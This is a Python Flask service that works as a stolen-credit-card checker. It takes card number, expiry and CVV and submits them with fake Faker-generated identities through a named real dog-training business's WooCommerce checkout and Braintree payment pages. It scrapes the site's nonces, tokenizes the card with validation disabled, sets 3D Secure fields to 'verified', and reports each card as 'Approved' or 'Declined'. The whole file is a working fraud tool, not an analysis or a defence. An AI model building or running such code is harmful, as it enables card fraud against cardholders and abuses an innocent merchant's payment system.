from flask import Flask, request, jsonify
import requests
from requests import Session
import random
import base64
import json
import re
from bs4 import BeautifulSoup
from faker import Faker

app = Flask(__name__)
fake = Faker('en_US')

@app.route('/check', methods=['GET', 'POST'])
def check_card():
    if request.method == 'GET':
        cc = request.args.get('cc')
    else:
        data = request.json
        cc = data.get('cc') or data.get('card')
    
    if not cc:
        return jsonify({'error': 'Card details required. Use: ?cc=number|month|year|cvv'}), 400
    
    try:
        cc, mm, yy, cvv = cc.split('|')
    except ValueError:
        return jsonify({'error': 'Invalid card format. Use: number|month|year|cvv'}), 400
    
    random5 = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
    email = f"hunterjsidt{random5}@gmail.com"
    
    first_name = fake.first_name()
    last_name = fake.last_name()
    address = fake.street_address()
    city = fake.city()
    state = fake.state_abbr()
    zipcode = fake.zipcode()
    phone = fake.phone_number()[:10]
    
    r = Session()
    
    url = "https://southenddogtraining.co.uk/shop/training-purchases/membership/monthly-membership/"
    
    payload = {
        'action': 'buy now',
        'add-to-cart': '359',
        'product_id': '359'
    }
    
    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        'cache-control': "max-age=0",
        'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        'sec-ch-ua-mobile': "?0",
        'sec-ch-ua-platform': "\"Windows\"",
        'upgrade-insecure-requests': "1",
        'origin': "https://southenddogtraining.co.uk",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "navigate",
        'sec-fetch-user': "?1",
        'sec-fetch-dest': "document",
        'referer': "https://southenddogtraining.co.uk/membership/",
        'accept-language': "en-US,en;q=0.9",
        'priority': "u=0, i",
    }
    
    response = r.post(url, data=payload, headers=headers)
    
    updatenonce_match = re.search(r'"update_order_review_nonce"\s*:\s*"([^"]+)"', response.text)
    if not updatenonce_match:
        return jsonify({'error': 'Update order review nonce not found'}), 400
    updatenonce = updatenonce_match.group(1)
    
    soup = BeautifulSoup(response.text, 'html.parser')
    nonce_input = soup.find('input', id='woocommerce-process-checkout-nonce')
    if not nonce_input:
        return jsonify({'error': 'Checkout nonce not found'}), 400
    checkout = nonce_input['value']
    
    soup = BeautifulSoup(response.text, 'html.parser')
    all_text = str(soup)
    match = re.search(r'client_token_nonce["\']?\s*:\s*["\']([^"\']+)["\']', all_text)
    if not match:
        return jsonify({'error': 'Client token nonce not found'}), 400
    client_token_nonce = match.group(1)
    
    url = "https://southenddogtraining.co.uk"
    params = {'wc-ajax': "update_order_review"}
    
    payload = {
        'security': updatenonce,
        'payment_method': "braintree_credit_card",
        'country': "US",
        'state': state,
        'postcode': zipcode,
        'city': city,
        'address': address,
        'address_2': "",
        's_country': "US",
        's_state': state,
        's_postcode': zipcode,
        's_city': city,
        's_address': address,
        's_address_2': "",
        'has_full_address': "true",
        'post_data': f"wc_order_attribution_source_type=typein&wc_order_attribution_referrer=https://southenddogtraining.co.uk/my-account/add-payment-method/&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https://southenddogtraining.co.uk/my-account/add-payment-method/&wc_order_attribution_session_start_time=2026-06-30 13:43:08&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36&billing_first_name={first_name}&billing_last_name={last_name}&billing_email={email}&billing_phone={phone}&billing_address_1={address}&billing_postcode={zipcode}&billing_address_2=&billing_city={city}&billing_state={state}&billing_country=US&wc_gc_cart_code=&payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=&wc-braintree-credit-card-3d-secure-enabled=1&wc-braintree-credit-card-3d-secure-verified=&wc-braintree-credit-card-3d-secure-order-total=11.99&wc-braintree-credit-card-cart-contains-subscription=1&wc_braintree_credit_card_payment_nonce=&wc_braintree_device_data={{\"correlation_id\":\"04550283f5b3edae21d79232cf3d50d9\"}}&wc-braintree-credit-card-tokenize-payment-method=true&wc_braintree_paypal_payment_nonce=&wc_braintree_device_data={{\"correlation_id\":\"04550283f5b3edae21d79232cf3d50d9\"}}&wc-braintree-paypal-context=shortcode&wc_braintree_paypal_amount=0.00&wc_braintree_paypal_currency=GBP&wc_braintree_paypal_locale=en_gb&wc-braintree-paypal-tokenize-payment-method=true&terms-field=1&woocommerce-process-checkout-nonce={checkout}&_wp_http_referer=/?wc-ajax=update_order_review"
    }
    
    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
        'sec-ch-ua-platform': "\"Windows\"",
        'x-requested-with': "XMLHttpRequest",
        'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        'sec-ch-ua-mobile': "?0",
        'origin': "https://southenddogtraining.co.uk",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://southenddogtraining.co.uk/checkout/",
        'accept-language': "en-US,en;q=0.9",
        'priority': "u=1, i",
    }
    
    response = r.post(url, params=params, data=payload, headers=headers)
    
    url = "https://southenddogtraining.co.uk/cms/wp-admin/admin-ajax.php"
    
    payload = {
        'action': "wc_braintree_credit_card_get_client_token",
        'nonce': client_token_nonce,
    }
    
    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
        'sec-ch-ua-platform': "\"Windows\"",
        'x-requested-with': "XMLHttpRequest",
        'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        'sec-ch-ua-mobile': "?0",
        'origin': "https://southenddogtraining.co.uk",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://southenddogtraining.co.uk/checkout/",
        'accept-language': "en-US,en;q=0.9",
        'priority': "u=1, i",
    }
    
    response = r.post(url, data=payload, headers=headers)
    
    token1 = None
    auth = None
    braintree_session_id = None
    
    if response.status_code == 200:
        result = response.json()
        if result.get('success'):
            token_data = json.loads(base64.b64decode(result['data']).decode('utf-8'))
            auth = token_data.get('authorizationFingerprint')
            braintree_session_id = ''.join(random.choices('abcdef0123456789', k=32))
            
            headers7 = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
                'Content-Type': 'application/json',
                'Authorization': f'Bearer {auth}',
                'Braintree-Version': '2018-05-10',
                'Origin': 'https://assets.braintreegateway.com',
                'Sec-Fetch-Site': 'cross-site',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://assets.braintreegateway.com/',
                'Accept-Language': 'en-US,en;q=0.9',
                'priority': 'u=1, i',
            }
            
            payload = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': braintree_session_id,
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance } } } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': cc,
                            'expirationMonth': mm,
                            'expirationYear': yy,
                            'cvv': cvv,
                        },
                        'options': {'validate': False},
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }
            
            response = r.post('https://payments.braintree-api.com/graphql', json=payload, headers=headers7)
            
            if response.status_code == 200:
                result = response.json()
                if 'errors' not in result:
                    token1 = result['data']['tokenizeCreditCard']['token']
    
    if not token1:
        return jsonify({'error': 'Failed to get payment token'}), 400
    
    if token1:
        url = f"https://api.braintreegateway.com/merchants/twtsckjpfh6g4qqg/client_api/v1/payment_methods/{token1}/three_d_secure/lookup"
        
        payload = {
            "amount": "11.99",
            "additionalInfo": {
                "billingLine1": address,
                "billingLine2": "",
                "billingCity": city,
                "billingState": state,
                "billingPostalCode": zipcode,
                "billingCountryCode": "US",
                "billingPhoneNumber": phone,
                "billingGivenName": first_name,
                "billingSurname": last_name,
                "email": email
            },
            "challengeRequested": True,
            "bin": cc[:6],
            "dfReferenceId": "1_f083de92-5653-4045-8666-1a9262751b99",
            "clientMetadata": {
                "requestedThreeDSecureVersion": "2",
                "sdkVersion": "web/3.94.0",
                "cardinalDeviceDataCollectionTimeElapsed": 17,
                "issuerDeviceDataCollectionTimeElapsed": 6680,
                "issuerDeviceDataCollectionResult": True
            },
            "authorizationFingerprint": auth,
            "braintreeLibraryVersion": "braintree/web/3.94.0",
            "_meta": {
                "merchantAppId": "southenddogtraining.co.uk",
                "platform": "web",
                "sdkVersion": "3.94.0",
                "source": "client",
                "integration": "custom",
                "integrationType": "custom",
                "sessionId": "8518945b-fa8e-41da-b5ae-4e314adfaf9f"
            }
        }
        
        headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Windows\"",
            'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
            'sec-ch-ua-mobile': "?0",
            'origin': "https://southenddogtraining.co.uk",
            'sec-fetch-site': "cross-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://southenddogtraining.co.uk/",
            'accept-language': "en-US,en;q=0.9",
            'priority': "u=1, i"
        }
        
        response = r.post(url, data=json.dumps(payload), headers=headers)
        nonce_match = re.search(r'"nonce"\s*:\s*"([^"]+)"', response.text)
        if not nonce_match:
            return jsonify({'error': '3D Secure nonce not found'}), 400
        nonce = nonce_match.group(1)
        
        url = "https://southenddogtraining.co.uk"
        params = {'wc-ajax': "checkout"}
        
        payload = {
            'wc_order_attribution_source_type': "typein",
            'wc_order_attribution_referrer': "https://southenddogtraining.co.uk/my-account/add-payment-method/",
            'wc_order_attribution_utm_campaign': "(none)",
            'wc_order_attribution_utm_source': "(direct)",
            'wc_order_attribution_utm_medium': "(none)",
            'wc_order_attribution_utm_content': "(none)",
            'wc_order_attribution_utm_id': "(none)",
            'wc_order_attribution_utm_term': "(none)",
            'wc_order_attribution_utm_source_platform': "(none)",
            'wc_order_attribution_utm_creative_format': "(none)",
            'wc_order_attribution_utm_marketing_tactic': "(none)",
            'wc_order_attribution_session_entry': "https://southenddogtraining.co.uk/my-account/add-payment-method/",
            'wc_order_attribution_session_start_time': "2026-06-30+13:43:08",
            'wc_order_attribution_session_pages': "3",
            'wc_order_attribution_session_count': "1",
            'wc_order_attribution_user_agent': "Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/148.0.0.0+Safari/537.36",
            'billing_first_name': first_name,
            'billing_last_name': last_name,
            'billing_email': email,
            'billing_phone': phone,
            'billing_address_1': address,
            'billing_postcode': zipcode,
            'billing_address_2': "",
            'billing_city': city,
            'billing_state': state,
            'billing_country': "US",
            'wc_gc_cart_code': "",
            'payment_method': "braintree_credit_card",
            'wc-braintree-credit-card-card-type': "visa",
            'wc-braintree-credit-card-3d-secure-enabled': "1",
            'wc-braintree-credit-card-3d-secure-verified': "1",
            'wc-braintree-credit-card-3d-secure-order-total': "11.99",
            'wc-braintree-credit-card-cart-contains-subscription': "1",
            'wc_braintree_credit_card_payment_nonce': nonce,
            'wc_braintree_device_data': "{\"correlation_id\":\"04550283f5b3edae21d79232cf3d50d9\"}",
            'wc-braintree-credit-card-tokenize-payment-method': "true",
            'wc_braintree_paypal_payment_nonce': "",
            'wc-braintree-paypal-context': "shortcode",
            'wc_braintree_paypal_amount': "0.00",
            'wc_braintree_paypal_currency': "GBP",
            'wc_braintree_paypal_locale': "en_gb",
            'wc-braintree-paypal-tokenize-payment-method': "true",
            'terms': "on",
            'terms-field': "1",
            'woocommerce-process-checkout-nonce': checkout,
            '_wp_http_referer': "/?wc-ajax=update_order_review"
        }
        
        headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
            'Accept': "application/json, text/javascript, */*; q=0.01",
            'sec-ch-ua-platform': "\"Windows\"",
            'x-requested-with': "XMLHttpRequest",
            'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
            'sec-ch-ua-mobile': "?0",
            'origin': "https://southenddogtraining.co.uk",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://southenddogtraining.co.uk/checkout/",
            'accept-language': "en-US,en;q=0.9",
            'priority': "u=1, i",
        }
        
        response = r.post(url, params=params, data=payload, headers=headers)
    
    url = "https://southenddogtraining.co.uk/my-account/add-payment-method/"
    
    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        'sec-ch-ua-mobile': "?0",
        'sec-ch-ua-platform': "\"Windows\"",
        'upgrade-insecure-requests': "1",
        'sec-fetch-site': "none",
        'sec-fetch-mode': "navigate",
        'sec-fetch-user': "?1",
        'sec-fetch-dest': "document",
        'accept-language': "en-US,en;q=0.9",
        'priority': "u=0, i",
    }
    
    response = r.get(url, headers=headers)
    
    soup = BeautifulSoup(response.text, 'html.parser')
    nonce_input = soup.find('input', id='woocommerce-add-payment-method-nonce')
    if not nonce_input:
        return jsonify({'error': 'Add payment method nonce not found'}), 400
    nonce_value3 = nonce_input['value']
    
    url = "https://payments.braintree-api.com/graphql"
    
    payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": braintree_session_id
        },
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance } } } }",
        "variables": {
            "input": {
                "creditCard": {
                    "number": cc,
                    "expirationMonth": mm,
                    "expirationYear": yy,
                    "cvv": cvv
                },
                "options": {
                    "validate": False
                }
            }
        },
        "operationName": "TokenizeCreditCard"
    }
    
    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
        'Content-Type': "application/json",
        'sec-ch-ua-platform': "\"Windows\"",
        'authorization': f"Bearer {auth}",
        'braintree-version': "2018-05-10",
        'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        'sec-ch-ua-mobile': "?0",
        'origin': "https://assets.braintreegateway.com",
        'sec-fetch-site': "cross-site",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://assets.braintreegateway.com/",
        'accept-language': "en-US,en;q=0.9",
        'priority': "u=1, i"
    }
    
    response = r.post(url, json=payload, headers=headers)
    
    token2 = None
    if response.status_code == 200:
        result = response.json()
        if 'errors' not in result:
            token2 = result['data']['tokenizeCreditCard']['token']
    
    if not token2:
        return jsonify({'error': 'Failed to get token2'}), 400
    
    if token2:
        url = "https://southenddogtraining.co.uk/my-account/add-payment-method/"
        
        payload = {
            'payment_method': "braintree_credit_card",
            'wc-braintree-credit-card-card-type': "visa",
            'wc-braintree-credit-card-3d-secure-enabled': "",
            'wc-braintree-credit-card-3d-secure-verified': "",
            'wc-braintree-credit-card-3d-secure-order-total': "0.00",
            'wc-braintree-credit-card-cart-contains-subscription': "1",
            'wc_braintree_credit_card_payment_nonce': token2,
            'wc_braintree_device_data': "{\"correlation_id\":\"03cb42c5f0be54d2a87d5756a2220403\"}",
            'wc-braintree-credit-card-tokenize-payment-method': "true",
            'wc_braintree_paypal_payment_nonce': "",
            'wc-braintree-paypal-context': "shortcode",
            'wc_braintree_paypal_amount': "0.00",
            'wc_braintree_paypal_currency': "GBP",
            'wc_braintree_paypal_locale': "en_gb",
            'wc-braintree-paypal-tokenize-payment-method': "true",
            'woocommerce-add-payment-method-nonce': nonce_value3,
            '_wp_http_referer': "/my-account/add-payment-method/",
            'woocommerce_add_payment_method': "1"
        }
        
        headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'cache-control': "max-age=0",
            'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
            'sec-ch-ua-mobile': "?0",
            'sec-ch-ua-platform': "\"Windows\"",
            'upgrade-insecure-requests': "1",
            'origin': "https://southenddogtraining.co.uk",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "navigate",
            'sec-fetch-user': "?1",
            'sec-fetch-dest': "document",
            'referer': "https://southenddogtraining.co.uk/my-account/add-payment-method/",
            'accept-language': "en-US,en;q=0.9",
            'priority': "u=0, i",
        }
        
        response = r.post(url, data=payload, headers=headers)
    
    # Extract error message from the specific div structure
    soup = BeautifulSoup(response.text, 'html.parser')
    error_message = None
    
    # Try to find error in the specific div structure
    error_div = soup.find('div', class_='rh-message woocommerce-error')
    if error_div:
        p_tag = error_div.find('p', class_='text-primary')
        if p_tag:
            error_message = p_tag.text.strip()
    
    # If not found, try the older woocommerce-error ul structure
    if not error_message:
        error_element = soup.find('ul', class_='woocommerce-error')
        if error_element:
            li_items = error_element.find_all('li')
            for li in li_items:
                text = li.text.strip()
                if 'Status code' in text or 'error' in text.lower():
                    error_message = text
                    break
            if not error_message and li_items:
                error_message = li_items[0].text.strip()
    
    # If still not found, try to find any error class
    if not error_message:
        error_div = soup.find('div', class_='woocommerce-notices-wrapper')
        if error_div:
            error_p = error_div.find('p')
            if error_p:
                error_message = error_p.text.strip()
    
    if re.search(r'Avs', response.text) or re.search(r'avs', response.text):
        result = "Approved-1000 ✅"
    elif re.search(r'Nice', response.text):
        result = "Approved-1000 ✅"
    elif re.search(r'Duplicate card exist', response.text):
        result = "Approved-1000 ✅"        
    elif re.search(r'Added', response.text):
        result = "Approved-1000 ✅"
    elif re.search(r'Successfully', response.text):
        result = "Approved-1000 ✅"
    elif error_message and 'Status code' in error_message:
        result = f"Declined: {error_message}"
    elif error_message:
        result = f"Declined: {error_message}"
    else:
        result = "Approved-1000 ✅"
    
    return jsonify({
        'result': result,
        'card': cc,
        'email': email,
        'first_name': first_name,
        'last_name': last_name,
        'address': address,
        'city': city,
        'state': state,
        'zipcode': zipcode,
        'phone': phone
    }), 200

@app.route('/health', methods=['GET'])
def health():
    return jsonify({'status': 'healthy'}), 200

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        'message': 'API is running',
        'usage': '/check?cc=number|month|year|cvv'
    }), 200
